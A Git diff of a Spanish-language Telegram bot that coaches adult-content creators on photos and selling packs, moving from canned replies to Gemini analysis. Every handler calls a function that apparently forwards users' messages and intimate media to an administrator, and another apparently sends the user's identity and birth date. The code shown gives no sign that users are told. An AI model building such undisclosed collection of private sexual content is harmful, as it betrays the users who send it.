-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy atrevida desde un ángulo inferior.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Juega con la ropa. Baja un tirante del hombro, eso genera mucha expectativa.\n4. **Tip de venta:** Aprovecha los días festivos (San Valentín, Navidad) para vender packs temáticos.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto sentada que resalta muchísimo tus piernas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Cruza las piernas y ponte de puntillas. Eso estiliza y hace que se vean más largas.\n4. **Tip de venta:** Ofrece un descuento por tiempo limitado (ej. 'solo por hoy') para crear urgencia en la compra.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una selfie muy íntima y cercana.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que el fondo esté ordenado o desenfocado. El desorden distrae.\n4. **Tip de venta:** Haz una oferta de '2x1' en tus packs de fotos. A los suscriptores les encanta ahorrar.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una pose muy dominante y segura.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a tomarte la foto con las manos en el cabello, hacia atrás. Se ve muy natural.\n4. **Tip de venta:** Los packs de 'Buenos días' o 'Buenas noches' se venden muy bien. ¡Inténtalo!",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un primer plano de tu rostro y escote.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Enfoca más tu rostro y tu escote al mismo tiempo. Es el encuadre favorito de la mayoría.\n4. **Tip de venta:** Pregunta a tus fans qué es lo que más les gusta de ti. Luego crea un pack enfocado en eso y véndelo.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto en la cama muy espontánea.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a tomarte la foto en la bañera o en la ducha. El agua y el vapor dan un efecto muy sensual.\n4. **Tip de venta:** Crea un 'Nivel VIP' en tu OnlyFans y ofrece estas fotos exclusivas solo para ellos.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucha luz y colores vivos.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa un espejo para tomarte la foto. El reflejo da un toque de misterio que a los fans les encanta.\n4. **Tip de venta:** Si tienes un pack muy bueno, guárdalo para el final del mes para cumplir la cuota de ventas.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una pose acostada que se ve muy relajada y sexy.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Pon sábanas de seda o satén. La textura resalta muchísimo en cámara.\n4. **Tip de venta:** Ofrece la posibilidad de que el fan pida una foto personalizada con su nombre. Cóbrale más caro.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un encuadre muy ajustado que resalta tus curvas.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Aleja un poco la cámara para mostrar todo el conjunto, no solo una parte.\n4. **Tip de venta:** Envía un mensaje masivo ofreciendo un 'Pack de Bienvenida' para nuevos suscriptores.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Un gesto con las manos muy sugerente.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Usa lencería de colores oscuros (negro o rojo). Resaltan muchísimo más.\n4. **Tip de venta:** Manda la foto a primera hora de la mañana. Los fans suelen revisar el teléfono al despertar.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto con mucho movimiento de cabello.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Intenta tomarte la foto en un ambiente con poca luz y usa velas. Da un ambiente muy íntimo.\n4. **Tip de venta:** Crea encuestas en tu muro preguntando '¿Qué foto quieren ver hoy?'. Involúcralos.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** La toma desde arriba te hace ver muy dominante.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Prueba a susurrar o gemir suavemente mientras grabas. El audio es clave.\n4. **Tip de venta:** Las fotos estilo 'POV' (Punto de vista) venden muchísimo.",
-            f"🔍 **Análisis de tu foto:**\n1. **Lo que veo:** Una foto muy sensual con una sonrisa pícara.\n2. **Calidad de la luz:** {calidad_luz}\n3. **Cómo mejorarlo:** Asegúrate de que la expresión sea natural. No fuerces la sonrisa.\n4. **Tip de venta:** Sube un fragmento de la foto (recortada) a tu feed y pon el resto de pago."
-        ]
-        return random.choice(respuestas_foto)
-
-# ======================
-# LÓGICA DE CHAT CON MEMORIA
-# ======================
-def generar_respuesta_chat(user_id, mensaje):
-    usuario = obtener_usuario(user_id)
-    memoria_nombre = usuario[5]
-    msg_lower = mensaje.lower()
-    
-    match_nombre = re.search(r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)", msg_lower)
+def extraer_y_guardar_nombre(user_id: int, texto: str) -> None:
+    match_nombre = re.search(
+        r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)",
+        texto.lower(),
+    )
     if match_nombre:
-        nombre_extraido = match_nombre.group(1).capitalize()
-        guardar_memoria_nombre(user_id, nombre_extraido)
-        return f"¡Mucho gusto, {nombre_extraido}! 😘 Me encanta conocerte. ¿En qué te puedo ayudar hoy?"
-        
-    if "como me llamo" in msg_lower or "mi nombre" in msg_lower or "quien soy" in msg_lower:
-        if memoria_nombre:
-            return f"¡Claro que sí! Te llamas {memoria_nombre}. 😉 No me olvido de ti tan fácil."
-        else:
-            return "Uy, no me has dicho tu nombre todavía. ¿Cómo te llamas? ✨"
+        guardar_memoria_nombre(user_id, match_nombre.group(1).capitalize())
 
-    if "hola" in msg_lower or "buenas" in msg_lower:
-        saludo = f"¡Hola {memoria_nombre}!" if memoria_nombre else "¡Hola!"
-        return random.choice([f"{saludo} 😘 ¿Cómo estás?", f"{saludo} preciosa. ¿En qué te ayudo?", "¡Hey! 🔥 Me alegra leerte."])
-    elif "bien" in msg_lower or "como estas" in msg_lower:
-        return "¡Súper bien! 💋 Lista para ayudarte a mejorar tu contenido. ¿Qué me traes hoy?"
-    elif "gracias" in msg_lower:
-        return "¡De nada, amor! 😈 Para eso estoy. ¿Quieres que analice alguna foto o video?"
-    elif "bye" in msg_lower or "adios" in msg_lower or "chao" in msg_lower:
-        return "¡Adiós! 🌙 Aquí estaré cuando me necesites. ¡Que tengas buen día!"
-    
-    return random.choice(["Cuéntame más... 😉", "Interesante. ¿Y eso cómo te hace sentir?", "Mmm, me gusta de lo que hablas. Mándame una foto si quieres consejos.", "Jaja, me encanta hablar contigo. ¿Quieres que veamos alguna foto tuya? 🔥"])
+
+async def verificar_sesion_activa(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
+    usuario_db = obtener_usuario(user_id)
+    if not usuario_db:
+        if update.message:
+            await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
+        return False
+
+    ultimo_mensaje_str = usuario_db["ultimo_mensaje"]
+    if ultimo_mensaje_str:
+        ultimo_mensaje = datetime.fromisoformat(ultimo_mensaje_str)
+        if datetime.now() - ultimo_mensaje > timedelta(minutes=15):
+            borrar_todo(user_id)
+            actualizar_tiempo(user_id)
+            await reenviar_al_admin(update, context)
+            if update.message:
+                await update.message.reply_text(
+                    "⏳ **Sesión cerrada por inactividad.**\n\n"
+                    "¡Hola de nuevo! 🌙 ¿De qué hablábamos? Mándame una foto, video o audio para empezar."
+                )
+            return False
+
+    return True
+
 
 # ======================
 # HANDLERS
 # ======================
-async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not obtener_usuario(user_id):
-        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
-
-    actualizar_tiempo(user_id)
-    await reenviar_al_admin(update, context)
-    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
-    
-    try:
-        photo_file = await update.message.photo[-1].get_file()
-        photo_bytes = await photo_file.download_as_bytearray()
-        analisis = analizar_contenido(tipo="foto", imagen_bytes=photo_bytes)
-        await msg.edit_text(analisis)
-    except Exception as e:
-        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")
-
-async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not obtener_usuario(user_id):
-        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
-
-    actualizar_tiempo(user_id)
-    await reenviar_al_admin(update, context)
-    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")
-
-    try:
-        file = None
-        if update.message.video and update.message.video.thumbnail:
-            file = await update.message.video.thumbnail.get_file()
-        elif update.message.video_note and update.message.video_note.thumbnail:
-            file = await update.message.video_note.thumbnail.get_file()
-        elif update.message.animation and update.message.animation.thumbnail:
-            file = await update.message.animation.thumbnail.get_file()
-
-        if file:
-            img_bytes = await file.download_as_bytearray()
-            analisis = analizar_contenido(tipo="video", imagen_bytes=img_bytes)
-            await msg.edit_text(analisis)
-        else:
-            analisis = analizar_contenido(tipo="video", imagen_bytes=None)
-            await msg.edit_text(analisis)
-    except Exception as e:
-        await msg.edit_text("🎬 Vi tu video y ya lo recibí.")
-
-async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not obtener_usuario(user_id):
-        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
-
-    actualizar_tiempo(user_id)
-    await reenviar_al_admin(update, context)
-    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
-    
-    try:
-        analisis = analizar_contenido(tipo="audio")
-        await msg.edit_text(analisis)
-    except Exception as e:
-        await msg.edit_text("🎧 Escuché tu audio, pero no pude analizarlo bien.")
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.effective_user:
+        return
     user_id = update.effective_user.id
     if not obtener_usuario(user_id):
         await update.message.reply_text("¡Hola! 🌙 Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:")
@@ -449,54 +418,176 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         actualizar_tiempo(user_id)
         await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video o audio.")
 
-async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+async def reset_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.effective_user:
+        return
+    user_id = update.effective_user.id
+    borrar_todo(user_id)
+    actualizar_tiempo(user_id)
+    await update.message.reply_text("🧹 Memoria borrada. Empezamos de cero 😉")
+
+
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.effective_user:
+        return
+    user_id = update.effective_user.id
+    if not await verificar_sesion_activa(update, context, user_id):
+        return
+
+    actualizar_tiempo(user_id)
+    await reenviar_al_admin(update, context)
+    await update.message.chat.send_action(action="typing")
+    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
+
+    try:
+        photo_file = await update.message.photo[-1].get_file()
+        photo_bytes = await photo_file.download_as_bytearray()
+        caption = (update.message.caption or "").strip()
+        extraer_y_guardar_nombre(user_id, caption)
+        prompt = caption or "Analiza esta foto: luz, encuadre o pose, cómo mejorarla y una idea para conectar o monetizar."
+        analisis = await responder_con_gemini(user_id, prompt, imagen_bytes=photo_bytes)
+        await msg.delete()
+        await enviar_por_trozos(update, analisis)
+    except Exception as exc:
+        logger.exception("Error analizando foto con Gemini: %s", exc)
+        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien ahora mismo.")
+
+
+async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.effective_user:
+        return
+    user_id = update.effective_user.id
+    if not await verificar_sesion_activa(update, context, user_id):
+        return
+
+    actualizar_tiempo(user_id)
+    await reenviar_al_admin(update, context)
+    await update.message.chat.send_action(action="typing")
+    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")
+
+    try:
+        caption = (update.message.caption or "").strip()
+        extraer_y_guardar_nombre(user_id, caption)
+        prompt = caption or "Analiza este video o GIF: movimiento, luz, encuadre, cómo mejorarlo y una idea para monetizar o conectar."
+
+        media_obj = update.message.video or update.message.video_note or update.message.animation
+        file_size = getattr(media_obj, "file_size", 0) or 0
+
+        if media_obj and file_size <= 15 * 1024 * 1024:
+            media_file = await media_obj.get_file()
+            media_bytes = await media_file.download_as_bytearray()
+            mime_type = getattr(media_obj, "mime_type", None) or "video/mp4"
+            analisis = await responder_con_gemini(
+                user_id,
+                prompt,
+                video_bytes=media_bytes,
+                video_mime=mime_type,
+            )
+        elif media_obj and getattr(media_obj, "thumbnail", None):
+            thumb_file = await media_obj.thumbnail.get_file()
+            thumb_bytes = await thumb_file.download_as_bytearray()
+            analisis = await responder_con_gemini(
+                user_id,
+                f"{prompt} (El archivo era grande, analiza este fotograma de referencia).",
+                imagen_bytes=thumb_bytes,
+            )
+        else:
+            analisis = await responder_con_gemini(
+                user_id,
+                f"{prompt} (El usuario envió un video/GIF sin vista previa descargable).",
+            )
+
+        await msg.delete()
+        await enviar_por_trozos(update, analisis)
+    except Exception as exc:
+        logger.exception("Error analizando video/GIF con Gemini: %s", exc)
+        await msg.edit_text("🎬 Recibí tu video/GIF, pero tuve un problema al analizarlo.")
+
+
+async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.effective_user:
+        return
+    user_id = update.effective_user.id
+    if not await verificar_sesion_activa(update, context, user_id):
+        return
+
+    actualizar_tiempo(user_id)
+    await reenviar_al_admin(update, context)
+    await update.message.chat.send_action(action="typing")
+    msg = await update.message.reply_text("🎧 Escuchando tu audio...")
+
+    try:
+        audio_obj = update.message.voice or update.message.audio
+        audio_file = await audio_obj.get_file()
+        audio_bytes = await audio_file.download_as_bytearray()
+        mime_type = getattr(audio_obj, "mime_type", None) or "audio/ogg"
+        caption = (update.message.caption or "").strip()
+        extraer_y_guardar_nombre(user_id, caption)
+        prompt = caption or "Escucha este audio: comenta el tono de voz, cómo mejorarlo y una idea de contenido o monetización."
+
+        analisis = await responder_con_gemini(
+            user_id,
+            prompt,
+            audio_bytes=audio_bytes,
+            audio_mime=mime_type,
+        )
+        await msg.delete()
+        await enviar_por_trozos(update, analisis)
+    except Exception as exc:
+        logger.exception("Error analizando audio con Gemini: %s", exc)
+        await msg.edit_text("🎧 Escuché tu audio, pero no pude procesarlo bien.")
+
+
+async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not update.message or not update.message.text or not update.effective_user:
+        return
+
     text = update.message.text.strip()
     user = update.effective_user
-    if text.startswith('/'): return
+    if text.startswith("/"):
+        return
 
     usuario_db = obtener_usuario(user.id)
-    
     if usuario_db:
-        ultimo_mensaje_str = usuario_db[4]
-        if ultimo_mensaje_str:
-            ultimo_mensaje = datetime.fromisoformat(ultimo_mensaje_str)
-            ahora = datetime.now()
-            diferencia = ahora - ultimo_mensaje
-            
-            if diferencia > timedelta(minutes=15):
-                borrar_todo(user.id)
-                await update.message.reply_text("⏳ **Sesión cerrada por inactividad.**\n\n¡Hola de nuevo! 🌙 ¿De qué hablábamos? Mándame una foto, video o audio para empezar.")
-                actualizar_tiempo(user.id)
-                await reenviar_al_admin(update, context)
-                return
+        if not await verificar_sesion_activa(update, context, user.id):
+            return
 
         actualizar_tiempo(user.id)
         await reenviar_al_admin(update, context)
-        await update.message.chat.send_action(action="typing") 
-        match_nombre = re.search(r"(?:me llamo|soy|mi nombre es)\s+([a-zA-ZáéíóúÁÉÍÓÚñÑ]+)", text.lower())
-        if match_nombre:
-            guardar_memoria_nombre(user.id, match_nombre.group(1).capitalize())
+        await update.message.chat.send_action(action="typing")
+        extraer_y_guardar_nombre(user.id, text)
+
         try:
             respuesta = await responder_con_gemini(user.id, text)
-        except Exception as e:
-            print(f"Error en Gemini: {e}")
-            respuesta = generar_respuesta_chat(user.id, text)
-        return await update.message.reply_text(respuesta)
-    
+        except Exception as exc:
+            logger.exception("Error en Gemini: %s", exc)
+            respuesta = "Ups, tuve un problema conectando con Gemini ahora mismo. ¿Me repites? 😉"
+
+        await enviar_por_trozos(update, respuesta)
+        return
+
     try:
         fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
         hoy = datetime.now()
-        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))
+        edad = (
+            hoy.year
+            - fecha_nacimiento.year
+            - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))
+        )
 
-        if edad < 18: return await update.message.reply_text("Debes ser mayor de 18 años.")
-            
+        if edad < 18:
+            await update.message.reply_text("Debes ser mayor de 18 años.")
+            return
+
         guardar_usuario(user.id, user.first_name, user.username, edad)
-        await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos o audios.")
-        
+        await update.message.reply_text(
+            f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos, videos o audios."
+        )
         await enviar_expediente_completo(context, user, text, edad)
-        
-    except:
+    except ValueError:
         await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA")
+
 
 # ======================
 # MAIN (WEBHOOKS)
@@ -505,17 +596,25 @@ if __name__ == "__main__":
     application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("reset", reset_cmd))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
+    application.add_handler(
+        MessageHandler(
+            filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION,
+            handle_video_or_gif,
+        )
+    )
     application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))
+    application.add_handler(
+        MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat)
+    )
 
     port = int(os.environ.get("PORT", 8080))
 
-    print("🌙 Luna Bot iniciado como Policía...")
+    logger.info("Luna Bot iniciado...")
     application.run_webhook(
         listen="0.0.0.0",
         port=port,
         url_path=TELEGRAM_TOKEN,
-        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}"
+        webhook_url=f"{RENDER_EXTERNAL_URL}/{TELEGRAM_TOKEN}",
     )
